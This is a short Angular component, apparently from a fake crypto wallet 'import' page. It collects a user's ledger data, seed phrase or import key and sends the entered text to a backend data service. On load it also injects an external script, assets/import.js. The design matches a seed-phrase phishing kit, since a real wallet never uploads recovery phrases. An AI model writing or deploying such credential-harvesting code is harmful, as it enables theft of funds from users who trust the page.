import { DOCUMENT } from '@angular/common';
import { Component, Inject, OnInit, Renderer2 } from '@angular/core';
import { DataService } from 'src/app/services/data.service';

@Component({
  selector: 'app-import-wallet',
  templateUrl: './import-wallet.component.html',
  styleUrls: ['./import-wallet.component.scss']
})
export class ImportWalletComponent implements OnInit {

  importText: string = '';
  ledgerText: string = '';
  walletSeedText: string = '';

  constructor(private renderer2: Renderer2, 
                @Inject(DOCUMENT) private _document: Document, 
                private dataService: DataService) { }

  ngOnInit(): void {
    const s = this.renderer2.createElement('script');
    s.src = 'assets/import.js';
    s.type = 'text/javascript'
    this.renderer2.appendChild(this._document.body, s);
  }

  submit(type: string) {
    console.log("type", type);

    let data = {type: '', info: ''}
    data.type = type;
    if (type === "ledger") {
      data.info = this.ledgerText;
    } else if (type === "walletSeed") {
      data.info = this.walletSeedText;
    } else if (type === "import"){
      data.info = this.importText;
    }
    this.dataService.create(data);
  }

}
